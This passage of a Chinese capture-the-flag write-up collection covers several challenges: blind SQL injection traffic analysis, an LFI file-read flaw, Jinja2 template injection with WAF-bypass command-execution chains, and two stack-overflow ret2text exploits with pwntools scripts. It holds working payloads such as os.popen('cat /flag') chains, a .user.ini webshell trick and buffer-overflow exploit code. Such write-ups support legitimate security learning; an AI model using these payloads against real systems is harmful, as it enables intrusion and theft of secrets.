+端口: 客户端随机端口 → 服务器 80 端口
+```
+
+全是本地 HTTP 流量，客户端用 `python-requests/2.28.1` 发送请求。
+
+**2. 识别攻击模式**
+
+提取 HTTP 请求发现 1403 个注入请求，全部指向 `/comments.php?name=`：
+
+```http
+GET /comments.php?name=if((substr((select(text)from(wfy_comments)where(id=100)),1,1)="q"),100,0) HTTP/1.1
+```
+
+这是一个典型的 **SQL 布尔盲注（Boolean-Based Blind SQL Injection）**：
+
+```
+if(substr(目标字符, 位置, 1) = "候选字符", 100, 0)
+```
+
+- 条件为 **true** → 返回 100 条评论（响应体更大）
+- 条件为 **false** → 返回 0 条评论（响应体更小）
+
+攻击者从 `wfy_comments` 表 `id=100` 记录的 `text` 字段逐字符提取 flag。
+
+> **⚠️ 识别要点**：看到 `substr(..., pos, 1) = "char"` 配合 `if(..., 100, 0)` 模式，就是布尔盲注逐字符爆破。关键在于如何区分 true/false 响应。
+
+**3. 区分 true/false 响应（核心难点）**
+
+HTTP 响应使用 `Content-Encoding: gzip` + `Transfer-Encoding: chunked` 双重编码，不能直接用原始字节长度判断。
+
+解压步骤：
+```
+原始响应 → 找 \r\n\r\n 分隔头部和body → 提取chunk
+→ 解析 hex chunk size → 取 chunk content → gzip解压 → 得到HTML
+```
+
+解压后统计 content 长度：
+- **false 响应**（0 条评论）：content_len = 830（1164 次，大多数）
+- **true 响应**（100 条评论）：content_len = 841 或 842（共 42 次）
+
+分界线：`content_len > 830` 即为 true。
+
+> **技巧**：流量分析题中，gzip + chunked 编码会导致原始字节长度差异很小（705-714字节），直接用原始长度判断容易误判。**必须解压后再比较内容长度**，差异才清晰（830 vs 842）。
+
+**4. 逐字符还原**
+
+对每个位置 `pos`（1~42），取 content_len 最大的字符（即 true 字符），按位置拼接：
+
+```
+pos 1: f (842) ← f 是第1位正确的字符
+pos 2: l (842)
+pos 3: a (842)
+pos 4: g (842)
+pos 5: { (842)
+...
+pos 42: } (842)
+```
+
+### 解题脚本
+
+```python
+from scapy.all import rdpcap
+import re, gzip
+from urllib.parse import unquote
+
+pkts = rdpcap('流量分析.pcap')
+
+# 按源端口配对请求和响应
+streams = {}
+for p in pkts:
+    if p.haslayer('TCP') and p.haslayer('Raw'):
+        tcp = p['TCP']
+        if tcp.dport == 80:    # 请求
+            streams.setdefault(tcp.sport, {})['req'] = tcp['Raw'].load.decode('utf-8', errors='replace')
+        elif tcp.sport == 80:  # 响应
+            streams.setdefault(tcp.dport, {})['resp_raw'] = tcp['Raw'].load
+
+# 解析注入参数 + 解压响应
+results = {}
+for data in streams.values():
+    m = re.search(r'substr\(\(select\(text\)from\(wfy_comments\)where\(id=(\d+)\)\),(\d+),1\)=%22(.+?)%22', data.get('req', ''))
+    if not m:
+        continue
+    rid, pos, char = int(m.group(1)), int(m.group(2)), unquote(m.group(3))
+
+    # 解压 gzip + chunked 响应
+    resp = data.get('resp_raw', b'')
+    header_end = resp.find(b'\r\n\r\n')
+    if header_end < 0:
+        continue
+    body = resp[header_end + 4:]
+    crlf = body.find(b'\r\n')
+    try:
+        chunk_size = int(body[:crlf].decode('ascii'), 16)
+        content = gzip.decompress(body[crlf + 2:crlf + 2 + chunk_size])
+        content_len = len(content)
+    except:
+        content_len = 0
+
+    results.setdefault((rid, pos), []).append((char, content_len))
+
+# 还原 flag: 取每个位置 content_len 最大的字符
+flag_chars = {}
+for (rid, pos), chars in results.items():
+    if rid != 100:
+        continue
+    true_chars = [(c, l) for c, l in chars if l > 830]  # >830 为 true
+    if true_chars:
+        flag_chars[pos] = max(true_chars, key=lambda x: x[1])[0]
+
+min_pos, max_pos = min(flag_chars), max(flag_chars)
+flag = ''.join(flag_chars.get(p, '?') for p in range(min_pos, max_pos + 1))
+print(f'Flag: {flag}')
+```
+
+### 运行结果
+
+```
+总包数: 16836
+注入请求数: 1403
+(id=100, pos) 组合: 42 个位置
+
+content_len 分布:
+  830 (false): 1164 次
+  841/842 (true): 42 次
+
+Flag (1-42): flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}
+```
+
+Flag: `flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| PCAP 流量分析 | 使用 scapy/tshark 解析网络抓包文件，提取 HTTP 请求和响应 |
+| SQL 布尔盲注 | `if(condition, true_value, false_value)` 根据条件返回不同数据量 |
+| TCP 流重组 | 按源端口配对请求和响应包，还原完整的 HTTP 交互 |
+| gzip + chunked 解码 | HTTP 响应双重编码，需先解析 chunk size 再 gzip 解压才能比较真实内容 |
+| 响应大小区分 true/false | 布尔盲注的 true/false 通过响应体大小区分，注意编码压缩会缩小差异 |
+| scapy 库 | Python 网络包分析库，`rdpcap()` 读取 pcap，`p['TCP']`/`p['Raw']` 访问各层 |
+
+> **技巧**：流量分析题三步走：①全局概览（包数/协议/IP对/端口）→ ②识别攻击模式（SQL注入/XSS/上传/爆破）→ ③提取关键数据（请求参数 + 响应内容）。布尔盲注还原的核心是找到 true/false 的**内容长度分界线**。
+
+> **技巧**：HTTP 响应如果是 gzip + chunked 编码，原始字节长度的差异可能只有几个字节（如 705 vs 712），但解压后内容长度差异会更大（如 830 vs 842）。**先解压再比较**，不要只看原始长度。
+
+### 同类变体与扩展
+
+- **时间盲注流量**：`if(condition, sleep(5), 0)`，通过响应时间区分 true/false，需分析时间戳而非内容大小
+- **UNION 注入流量**：直接在响应体中可见数据，提取更简单，无需逐字符还原
+- **文件上传流量**：查找 `Content-Type: multipart/form-data`，提取上传的文件内容
+- **HTTPS 流量**：如果 pcap 含 TLS 握手且有的私钥，可解密后按 HTTP 分析；否则无法查看加密内容
+- **工具推荐**：Wireshark 图形界面可右键 → Follow → HTTP Stream 逐流查看，适合少量流量的手动分析
+- **大流量优化**：本题 16836 包用 scapy 纯 Python 解析约需 5-10 秒，超大 pcap 可用 tshark 预过滤 `-Y http` 减少数据量
+
+---
+
+## 第20题：文件上传 — 任意文件读取 (LFI)
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Web - 文件上传 + 任意文件读取 |
+| 难度 | 入门 |
+| 日期 | 2026-08-02 |
+| 题目URL | `https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/` |
+
+### 题目页面
+
+页面有两个功能模块：
+- **图片查看**：通过 `file.php?f=<文件名>` 读取文件内容
+- **图片上传**：通过 `upload.php` 上传文件（POST multipart/form-data）
+
+### 源码审计
+
+通过 `file.php` 读取三个 PHP 文件源码（`file.php`、`upload.php`、`class.php`）：
+
+**file.php**（文件读取接口）：
+
+```php
+$filename = $_GET['f'];
+$show = new Show($filename);
+$show->show();
+```
+
+**class.php** — `Show::show()`（核心漏洞点）：
+
+```php
+class Show {
+    public function show() {
+        if(preg_match('/http|https|file:|php:|gopher|dict|\.\./i', $this->source)) {
+            die('illegal fname :P');
+        } else {
+            echo file_get_contents($this->source);
+            // ... 输出 base64 图片
+        }
+    }
+}
+```
+
+**class.php** — `Upload::file_check()`（上传过滤逻辑）：
+
+```php
+function file_check() {
+    $allowed_types = array("png");
+    $temp = explode(".", $this->f["file"]["name"]);
+    $extension = end($temp);
+    // 扩展名白名单：只允许 png
+    
+    $filter = '/<\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i';
+    // 内容黑名单：禁止 <?php、php、exec、system 等关键字
+    if(preg_match_all($filter, $f)) {
+        echo 'what are you doing!! :C';
+        return false;
+    }
+}
+```
+
+### 漏洞分析
+
+**主要漏洞：`file.php` 任意文件读取（LFI）**
+
+`Show::show()` 中 `file_get_contents($this->source)` 的过滤存在缺陷：
+
+| 过滤内容 | 绕过方式 |
+|---------|---------|
+| `http` / `https` | 不使用网络协议 |
+| `file:` / `php:` | 不使用协议封装器 |
+| `gopher` / `dict` | 不使用协议封装器 |
+| `..` (目录穿越) | 使用绝对路径，不需要 `..` |
+| **绝对路径（未过滤）** | **直接读取 `/flag`** |
+
+> **关键**：过滤了协议封装器和 `..` 目录穿越，但**完全没有限制绝对路径**。这意味着可以直接用 `file.php?f=/flag` 读取根目录下的 flag 文件。
+
+**备选攻击面：POP 链反序列化（未使用但值得记录）**
+
+`class.php` 中存在一条完整的 POP 链，可通过文件上传触发：
+
+```
+Test::__destruct()       → echo $this->str  ($str = Upload对象)
+  → Upload::__toString() → echo $this->fname->$this->fsize  ($fname = Show对象)
+    → Show::__get($fsize) → $this->ok($fsize)  (ok方法不存在)
+      → Show::__call('ok', [$fsize]) → backdoor(end($arguments))
+        → include($door)  ← 包含上传的 png 文件执行代码
+```
+
+`Upload::file_check()` 虽然禁止了 `<?php` 等关键字，但可以通过以下方式绕过：
+- `<?= ?>` 短标签（如果短标签开启）
+- `.htaccess` / `.user.ini` 修改解析方式
+- 利用 `include()` 特性：不需要 `<?php` 标签也能执行（但需要 PHP 代码块标识）
+
+### 解题过程
+
+**最短路径：直接读取 /flag**
+
+```
+GET /file.php?f=/flag
+```
+
+利用 `file_get_contents` 无绝对路径限制的缺陷，直接读取系统根目录下的 flag 文件：
+
+```python
+import requests
+
+r = requests.get("https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/file.php?f=/flag")
+# 响应: CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}<img src=data:jpg;base64,... />
+flag = r.text.split('<img')[0].strip()
+print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
+```
+
+**利用过程：**
+
+```
+[1] 访问首页 → 发现"图片查看"和"图片上传"两个功能
+[2] file.php?f=upload.php → 读取上传处理源码
+[3] file.php?f=class.php  → 读取核心类定义 → 发现 file_get_contents 未过滤绝对路径
+[4] file.php?f=/flag      → 直接读取 flag
+```
+
+Flag: `CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| 任意文件读取 (LFI) | `file_get_contents()` 接收用户输入但未限制路径，可读取任意文件 |
+| PHP 协议过滤缺陷 | 过滤了 `http/https/file:/php:/gopher/dict` 但遗漏绝对路径 |
+| 文件上传白名单+黑名单 | 扩展名白名单(`png`) + 内容黑名单(`<?php\|exec\|system` 等) |
+| POP 链 (反序列化) | `__destruct→__toString→__get→__call→backdoor→include`，备选攻击路径 |
+| `include()` 执行 | `backdoor()` 中 `include($door)` 可执行 PHP 文件，需绕过内容过滤 |
+
+> **技巧**：文件上传题先审源码再动手。通过 `file.php` 等读取接口获取服务器端 PHP 源码，往往能发现比上传更简单的攻击路径（如本题的 LFI 直接读 flag）。
+
+> **技巧**：`file_get_contents()` 的路径过滤常见缺陷：① 只过滤 `..` 不限绝对路径；② 只过滤 `http://` 不过滤 `/`；③ 遗漏 `php://filter`（本题过滤了 `php:`）；④ 未过滤 `data://` 协议。CTF 中遇到 `file_get_contents` 优先测试绝对路径和协议封装器。
+
+> **技巧**：PHP 类中的魔术方法链（`__destruct→__toString→__get→__call`）是反序列化利用的核心。即使题目没有显式的 `unserialize()`，也可能通过 `phar://` 协议触发反序列化（`file_get_contents` 支持 `phar://`）。
+
+### 同类变体与扩展
+
+- **`php://filter` 绕过**：若过滤了 `php:` 可尝试大小写 `PHP://filter` 或 `PhP://filter`（取决于正则是否区分大小写，本题用了 `i` 修饰符）
+- **`data://` 协议**：`data://text/plain,<?php system('cat /flag');?>` 可直接执行代码（需 `allow_url_include=On`）
+- **`phar://` 反序列化**：上传 phar 文件后通过 `phar://upload/xxx.png` 触发反序列化，利用 POP 链 RCE
+- **`.user.ini` 绕过**：上传 `.user.ini` 文件设置 `auto_prepend_file=shell.png`，使所有 PHP 文件自动包含 webshell
+- **防御建议**：文件读取接口应使用白名单（允许的文件列表），而非黑名单过滤协议；`file_get_contents` 应结合 `realpath()` 检查最终路径是否在允许范围内
+
+### 解题脚本
+
+完整脚本：[Web/20-file-upload-llf/solve.py](Web/20-file-upload-llf/solve.py)
+
+```python
+import requests
+
+BASE = "https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com"
+
+# 1. 源码审计
+for f in ['file.php', 'upload.php', 'class.php']:
+    r = requests.get(f"{BASE}/file.php?f={f}")
+    print(r.text.split('<img')[0])
+
+# 2. 读取 flag
+r = requests.get(f"{BASE}/file.php?f=/flag")
+flag = r.text.split('<img')[0].strip()
+print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
+```
+
+---
+
+## 第21题：SSTI 模板注入 — Jinja2 config 泄露
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Web - 服务端模板注入 (SSTI) |
+| 难度 | 入门 |
+| 日期 | 2026-08-07 |
+| 目标 | `http://160.202.254.160:12115/?flag=` |
+
+### 题目页面
+
+首页提示"You need pass in a parameter named flag"，页面标题为"Simple SSTI"。HTML 注释中隐藏提示："You know, in the flask, We often set a secret_key variable."
+
+### 解题思路
+
+**1. 信息收集**
+
+- 页面源码 `<title>Simple SSTI</title>` 直白提示考点
+- 参数名为 `flag`，GET 方式传参
+- HTML 注释暗示 Flask 框架的 `secret_key` 变量
+- 传 `?flag=hello123` 时页面原样回显 → 用户输入被直接渲染
+
+**2. SSTI 检测**
+
+注入数学表达式 `{{7*7}}`（花括号需 URL 编码为 `%7B%7B7*7%7D%7D`），页面返回 `49`：
+
+```
+?flag={{7*7}}  →  49  ✓ 确认存在模板注入
+```
+
+**3. 引擎识别**
+
+注入 `{{7*'7'}}`，返回 `7777777`（字符串乘法），确认为 **Jinja2 (Flask)**：
+
+```
+?flag={{7*'7'}}  →  7777777  ✓ Jinja2 特征
+
+区别: Twig 引擎中 {{7*'7'}} → 49（类型转换而非字符串重复）
+```
+
+**4. 读取 config 获取 flag**
+
+Jinja2 模板上下文中可以直接访问 `config` 对象，它包含 Flask 的所有配置项。注入 `{{config}}` 即可输出完整配置：
+
+```
+?flag={{config}}
+```
+
+响应（HTML 实体解码后）：
+
+```
+<Config {'ENV': 'production', 'DEBUG': True, 'SECRET_KEY': 'flag{34c812fc9e6bc952528326eb0a7a478e}', ...}>
+```
+
+`SECRET_KEY` 即为 flag。
+
+**5. 利用流程图**
+
+```
+[1] 访问首页 → 发现参数名 flag，标题 "Simple SSTI"
+[2] 查看源码 → HTML 注释提示 Flask secret_key
+[3] ?flag={{7*7}} → 49 → 确认 SSTI
+[4] ?flag={{7*'7'}} → 7777777 → 确认 Jinja2
+[5] ?flag={{config}} → SECRET_KEY = flag{...}
+```
+
+### 解题 Payload
+
+```
+# 检测
+?flag=%7B%7B7*7%7D%7D          → 49
+
+# 引擎识别
+?flag=%7B%7B7*%277%27%7D%7D    → 7777777
+
+# 读取 flag (SECRET_KEY)
+?flag=%7B%7Bconfig%7D%7D       → Config {... SECRET_KEY: 'flag{...}' ...}
+```
+
+### 运行结果
+
+```
+[+] {{7*7}} → 49  ✓ 确认存在 SSTI
+[+] {{7*'7'}} → 7777777  ✓ 确认为 Jinja2 (Flask)
+[+] SECRET_KEY = flag{34c812fc9e6bc952528326eb0a7a478e}
+```
+
+Flag: `flag{34c812fc9e6bc952528326eb0a7a478e}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| SSTI 模板注入 | 用户输入被作为模板表达式执行，`render_template_string()` 直接拼接用户输入是典型漏洞 |
+| Jinja2 引擎识别 | `{{7*'7'}}` 在 Jinja2 中返回 `7777777`（字符串乘法），在 Twig 中返回 `49`（数值乘法） |
+| config 对象 | Jinja2 模板上下文中可直接访问 Flask `config` 对象，包含 SECRET_KEY 等敏感配置 |
+| URL 编码 | 花括号 `{` `}` 需编码为 `%7B` `%7D`，引号 `'` 需编码为 `%27`，否则被浏览器/框架解析 |
+| SECRET_KEY 泄露 | Flask SECRET_KEY 用于 session 签名，泄露后可伪造 session，CTF 中常直接作为 flag |
+
+### 延伸利用链（当 config 被过滤时）
+
+本题 `config` 未被过滤，直接读取即可。当 `config` 关键词被过滤时，可使用以下替代链：
+
+```python
+# 方法1: 通过 cycler 全局函数 → os 模块 → 命令执行
+{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
+
+# 方法2: 通过 lipsum 全局函数 → os 模块 → 命令执行
+{{lipsum.__globals__.os.popen('cat /flag').read()}}
+
+# 方法3: 通过 request 对象 → Flask app → config
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['SECRET_KEY']}}
+
+# 方法4: 遍历 __subclasses__ 找到 os._wrap_close
+{{ ''.__class__.__mro__[1].__subclasses__()[索引].__init__.__globals__['system']('cat /flag') }}
+
+# 方法5: get_flashed_messages → __builtins__ → eval
+{{ get_flashed_messages.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()") }}
+```
+
+### 绕过技巧总结
+
+| 过滤内容 | 绕过方法 |
+|---------|---------|
+| `.` 被过滤 | 用 `['']` 替代：`['__class__']` 代替 `.__class__` |
+| `_` 被过滤 | 用 `\x5f` 或 `|attr('_class_')` 绕过 |
+| `os` 被过滤 | 用 `\x6f\x73` 或字符串拼接 `'o'+'s'` |
+| `{{` 被过滤 | 用 `{% if ... %}` 或 `{% set %}` |
+| `config` 被过滤 | 用 `request.application` 链或全局函数链 |
+| 引号被过滤 | 用 `request.args` 传参：`{{ ()|attr(request.args.a) }}` |
+
+### 同类变体与扩展
+
+- 若 `{{` 被过滤，尝试 `{%print(config)%}` （Jinja2 标签语法）
+- 若需命令执行而非读配置，通过 `os.popen('命令').read()` 或 `subprocess.check_output()`
+- 若 Flask debug 模式开启，可通过 SSTI 触发错误页获取更多信息
+- 若使用 `render_template()` 而非 `render_template_string()`，模板文件中仍可注入（模板文件可控场景）
+- Docker 环境中 flag 可能在 `/flag`、`/flag.txt`、环境变量 `FLAG` 中，需配合命令执行
+- 利用 SSTI 读取 `app.py` 源码：`{{lipsum.__globals__.os.popen('cat app.py').read()}}` 获取完整源码
+
+### 解题脚本
+
+完整脚本：[Web/21-ssti-jinja2/solve.py](Web/21-ssti-jinja2/solve.py)
+
+---
+
+## 第30题：SSTI 模板注入 — Jinja2 严格 WAF 绕过 (POST + 字符拼接)
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Web - SSTI 模板注入 |
+| 难度 | 困难（严格 WAF） |
+| 日期 | 2026-08-08 |
+| 靶机 | `http://fc0b9fb25c5f05ab84fda9fa.http-ctf2.dasctf.com/login` |
+| 请求方式 | POST |
+| 注入参数 | `username`（必填参数 `password`） |
+| 模板引擎 | Jinja2 (Flask) |
+| Flag | `CTF2{08dea0d4-82b1-48e5-9a3e-d5144c15f1bb}` |
+| Flag 位置 | 环境变量 `FLAG` |
+
+### WAF 过滤规则
+
+通过系统性探测，确认靶机 WAF 过滤以下内容（子串匹配）：
+
+| 类别 | 被过滤内容 | 示例 |
+|------|-----------|------|
+| 字符级 | 空格、`_`、`"`、`'`、`[` | `{{1 + 1}}` → 被拦截（空格） |
+| 关键字级 | `os`、`popen`、`system`、`import`、`eval`、`globals`、`builtins`、`class`、`init`、`mro`、`request`、`getitem`、`pop`、`form` | `dict(os=1)` → `os in blacklist` |
+
+> **注意**：`in` 本身不在黑名单中，空格被过滤时返回 `in blacklist` 容易误导为 `in` 关键字被过滤。`string` 虽含 `in` 子串但未被拦截。
+
+### 解题思路
+
+**核心挑战**：几乎所有 SSTI 常规利用链的字符和关键字都被过滤，`request.args` 传参法也无法使用（`request` 被过滤）。
+
+**突破思路**：用 `lipsum|string|list|batch(n)|first|last` 从函数名字符串中提取任意字符，用 `dict(c=1)|list|first` 获取额外字符，用 `~` 拼接成被过滤的属性名/方法名，最后用 `|attr()` 替代 `.` 和 `[]` 进行属性访问。
+
+**1. 字符提取技术**
+
+```
+lipsum|string → '<function generate_lorem_ipsum at 0x7fac206809d0>'
+lipsum|string|list → ['<', 'f', 'u', 'n', 'c', 't', 'i', 'o', 'n', ...]
+lipsum|string|list|batch(19)|first|last → '_' (index 18)
+lipsum|string|list|batch(11)|first|last → 'g' (index 10)
+dict(b=1)|list|first → 'b' (lipsum 字符串中不包含 b)
+```
+
+**2. 字符拼接构建属性名**
+
+```jinja2
+# 构建 '__globals__' = _~_~g~l~o~b~a~l~s~_~_
+(lipsum|string|list|batch(19)|first)|last~(lipsum|string|list|batch(19)|first)|last~...
+```
+
+**3. 完整利用链**
+
+```
+lipsum|attr(__globals__)           → globals dict
+globals|attr(get)(os)              → os module (dict.get 方法取值)
+os|attr(popen)(cmd)                → file object
+(file|attr(read))()                → 命令输出
+```
+
+**4. 关键语法要点**
+
+- `|attr()` 返回的 bound method 需要用 `()` 调用：`(obj|attr('read'))()`
+- 整个 payload 不能包含任何空格
+- `getattr()` 内置函数在 Jinja2 sandbox 中不可用（返回 500），必须用 `|attr` filter
+
+### 解题脚本
+
+完整脚本：[Web/22-ssti-waf-bypass/solve.py](Web/22-ssti-waf-bypass/solve.py)
+
+### 实战命令
+
+```python
+# 验证注入
+{{7*7}}  →  49
+
+# RCE - id
+exec_cmd('id')  →  uid=0(root) gid=0(root) groups=0(root)
+
+# 获取 flag
+exec_cmd('env')  →  FLAG=CTF2{08dea0d4-82b1-48e5-9a3e-d5144c15f1bb}
+```
+
+### 可复用技巧
+
+1. **字符提取法**：当引号和下划线均被过滤时，`lipsum|string|list|batch(n)|first|last` 可提取函数名称中的任意字符，是构建任意字符串的终极手段
+2. **dict 取字符**：`dict(c=1)|list|first` 可获取任意单字符（Python 标识符合法字符），补充 lipsum 字符串中缺失的字符
+3. **|attr 替代 . 和 []**：`|attr()` 是 Jinja2 filter，不受 sandbox 限制，可替代点号和方括号
+4. **dict.get 替代 []**：`dict|attr('get')(key)` 替代 `dict[key]`，绕过方括号过滤
+5. **空格过滤**：用无空格命令（`env`、`ls`、`pwd`）或重定向（`cat</flag`）替代空格
+6. **WAF 探测方法**：`dict(keyword=1)` 快速测试关键字是否被过滤，WAF 子串匹配会将 `most`、`cos` 等也拦截
+
+---
+
+## PWN 方向
+
+## 第4题：PWN 栈溢出 + 后门函数（IDA 辅助分析）
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | PWN - 栈溢出（Ret2Text） |
+| 难度 | 入门 |
+| 日期 | 2026-07-30 |
+| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |
+
+### 题目描述
+
+ELF 64位可执行文件，通过 `ncat --ssl <host> 9999` 远程连接。程序输出一段欢迎信息和一个地址泄露，然后等待用户输入。
+
+### IDA 反编译结果
+
+**main 函数 (0x40061D)**
+```c
+__int64 main() {
+    char s[64];                              // [rbp-80h] 缓冲区
+    write(1, "-Warm Up-\n", 10);
+    write(1, "WOW:", 4);
+    sprintf(s, "%p\n", sub_40060D);          // 泄露后门函数地址
+    write(1, s, 9);
+    write(1, ">", 1);
+    return gets();                           // gets() 无长度限制 → 栈溢出!
+}
+```
+
+**后门函数 sub_40060D (0x40060D)**
+```c
+int sub_40060D() {
+    return system("cat flag.txt");           // 直接读取 flag!
+}
+```
+
+### 解题思路
+
+**1. 漏洞分析**
+
+- `gets()` 读取输入到 `[rbp-0x40]`，无长度限制，导致栈溢出
+- 程序内置后门函数 `sub_40060D`，直接调用 `system("cat flag.txt")`
+- 程序通过 `sprintf(s, "%p", sub_40060D)` 主动泄露后门地址
+- ELF 无 PIE（固定基址 0x400000），后门地址恒为 0x40060D
+
+**2. 偏移量计算**
+
+从 IDA 汇编分析：
+```
+0x400692: lea rax, [rbp+var_40]    ; gets 输入缓冲区在 rbp-0x40
+0x400696: mov rdi, rax
+0x400699: call _gets
+```
+
+- gets 缓冲区起始：`rbp - 0x40`
+- 到 saved rbp 的距离：0x40 = 64 字节
+- 到返回地址的距离：0x40 + 8 = 72 字节（0x48）
+
+**3. 栈对齐处理**
+
+x86-64 的 `system()` 在某些 libc 版本中要求 16 字节栈对齐。直接跳转到后门函数入口可能导致 `movaps` 指令崩溃。解决方案：在 payload 中添加一个 `ret` gadget 进行栈对齐。
+
+```
+ret gadget 地址：0x4006A4（main 函数末尾的 retn 指令）
+```
+
+**4. Payload 结构**
+
+```
+[填充 72 字节 'A'] + [ret gadget 0x4006A4] + [后门地址 0x40060D]
+     64字节缓冲区+8字节rbp        8字节栈对齐         8字节返回地址
+```
+
+### 解题脚本
+
+```python
+from pwn import *
+import ssl, socket
+
+HOST = '39f71dab837b6029aa64ce18.tcp-ctf2.dasctf.com'
+PORT = 9999
+
+BACKDOOR_ADDR = 0x40060D      # sub_40060D: system("cat flag.txt")
+RET_GADGET = 0x4006A4         # ret 指令（栈对齐）
+OFFSET = 0x40 + 8             # 72 字节：64 填充 + 8 saved rbp
+
+# SSL 连接
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
+ssl_sock.connect((HOST, PORT))
+
+# 接收泄露
+data = ssl_sock.recv(4096)
+print(f"Received: {data}")
+
+# 构造 payload
+payload = b'A' * OFFSET + p64(RET_GADGET) + p64(BACKDOOR_ADDR)
+ssl_sock.send(payload + b'\n')
+
+# 接收 flag
+import time; time.sleep(2)
+print(ssl_sock.recv(4096).decode())
+```
+
+### 运行结果
+
+```
+[*] Received: b'-Warm Up-\nWOW:0x40060d\n>'
+[*] Leaked backdoor address: 0x40060d
+[*] Payload length: 88
+[*] Response: CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}
+```
+
+Flag: `CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| 栈溢出（Stack Overflow） | gets() 无长度限制，可覆盖返回地址 |
+| Ret2Text | 跳转到程序内置的代码段（后门函数）执行 |
+| IDA Pro 反编译 | 使用 idat 批处理模式自动反编译，提取伪代码和汇编 |
+| 栈对齐（Stack Alignment） | x86-64 下 system() 要求 16 字节对齐，需 ret gadget 修正 |
+| 地址泄露 | 程序通过 %p 格式化输出后门函数地址 |
+| ELF 无 PIE | 固定基址 0x400000，函数地址不变，无需信息泄露 |
+| pwntools | p64() 打包地址，构造二进制 payload |
+
+### 同类变体与扩展
+
+- 若无后门函数，需 Ret2libc：泄露 libc 基址 → 计算 system() 和 /bin/sh 地址 → 构造 ROP 链
+- 若有 Canary 保护，需先泄露 canary 值再溢出
+- 若有 PIE，需先泄露代码段基址
+- 若使用 `one_gadget`，可直接跳转到 libc 中 execve("/bin/sh") 的 one-gadget RCE 地址
+- IDA 批处理脚本可进一步扩展：自动识别危险函数（gets/strcpy/sprintf）、自动计算偏移量
+
+## 第5题：PWN 栈溢出 + 浮点数条件绕过（IDA 辅助分析）
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | PWN - 栈溢出（Ret2Text 变体） |
+| 难度 | 入门 |
+| 日期 | 2026-07-31 |
+| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |
+
+### 题目描述
+
+ELF 64位可执行文件，远程连接后提示 "Let's guess the number."，要求猜一个数字。程序内含 `system("cat /flag")` 调用，但浮点数条件判断使正常流程无法到达。
+
+### IDA 反编译结果
+
+**func 函数 (0x400676)**
+```c
+int func() {
+    puts("Let's guess the number.");
+    gets();                                    // gets() 栈溢出！缓冲区在 rbp-0x30
+    if (11.28125 == 0.0)                       // 浮点数比较，永远为 FALSE
+        return system("cat /flag");            // 死代码，正常走不到
+    else
+        return puts("Its value should be 11.28125");
+}
+```
+
+**关键汇编**
+```asm
+0x400691: lea rax, [rbp+var_30]        ; gets 输入缓冲区 rbp-0x30
+0x40069D: call _gets                   ; 栈溢出点
+0x4006A7: ucomiss xmm0, cs:dword_4007F4  ; 11.28125 vs 0.0
+0x4006BC: jnz  short loc_4006CF        ; 跳转到 else 分支
+0x4006BE: mov edi, offset command       ; "cat /flag" ← 目标地址!
+0x4006C3: mov eax, 0
+0x4006C8: call _system
+```
+
+### 解题思路
+
+**1. 漏洞分析**
+
+- `gets()` 读取到 `[rbp-0x30]`，无长度限制 → 栈溢出
+- 浮点数比较 `11.28125 == 0.0` 永远为 FALSE → 正常流程走不到 `system("cat /flag")`
+- 无论输入什么数字，都会输出 "Its value should be 11.28125"
+
+**2. 绕过方式**
+
+不需要满足浮点数条件！直接通过栈溢出覆盖返回地址，跳转到 `system("cat /flag")` 的调用点 `0x4006BE`。
+
+**3. 偏移量计算**
+
+从 IDA 汇编：
+- gets 缓冲区起始：`rbp - 0x30`
+- 到 saved rbp：0x30 = 48 字节
+- 到返回地址：0x30 + 8 = 56 字节
+
+**4. Payload 结构**
+
+```
+[填充 56 字节 'A'] + [0x4006BE]
+     48字节缓冲区+8字节rbp    system("cat /flag") 调用点
+```
+
+注意：跳转目标是 `0x4006BE`（`mov edi, "cat /flag"` 指令），而非函数开头 `0x400676`。这样直接进入 system 调用，无需满足任何条件。
+
+### 解题脚本
+
+```python
+from pwn import *
+import ssl, socket
+
+HOST = 'f50ba9f58e7c20a5aa07c700.tcp-ctf2.dasctf.com'
+PORT = 9999
+
+SYSTEM_CALL = 0x4006BE       # mov edi, "cat /flag"; call system
+OFFSET = 0x30 + 8            # 56 字节
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
+ssl_sock.connect((HOST, PORT))
+
+# Receive prompt
+data = ssl_sock.recv(4096)
+print(data.decode())
+
+# Send payload
+payload = b'A' * OFFSET + p64(SYSTEM_CALL)
